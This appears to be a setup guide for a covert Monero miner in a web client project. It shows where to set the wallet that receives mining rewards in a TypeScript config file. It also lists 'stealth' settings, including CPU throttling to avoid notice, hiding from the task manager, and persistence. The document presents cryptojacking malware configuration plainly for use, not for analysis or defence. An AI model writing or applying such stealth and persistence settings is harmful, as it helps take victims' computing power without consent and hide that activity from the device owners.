How to Update Your Wallet Address

To update the Monero wallet address where mining rewards will be sent, edit the client/src/lib/minerConfig.ts file:

// Open the file client/src/lib/minerConfig.ts
// Find this section and replace with your wallet address:

export const minerConfig = {
  /**
   * Your Monero wallet address
   * IMPORTANT: Replace this with your actual Monero wallet address
   * All mining rewards will be sent to this address
   */
  wallet: "YOUR_MONERO_WALLET_ADDRESS_HERE",
  
  // Rest of the configuration...
};

Save the file after making your changes. The new wallet address will be used for all future mining operations.

Advanced Configuration Options

The miner configuration file provides several options to balance mining power with stealth:

Performance Settings

  • threads: Number of CPU threads to use (2-4 recommended for stealth)
  • cpuLimit: CPU usage percentage limit (40-60% recommended)
  • idleOnly: Only mine when the computer is idle
  • startupDelay: Delay in seconds before starting mining

Stealth Settings

  • background: Run as a background process
  • hideFromTaskManager: Attempt to hide from task manager
  • persistenceLevel: How aggressively to maintain persistence

Edit these settings in the client/src/lib/minerConfig.ts file to customize the miner behavior.
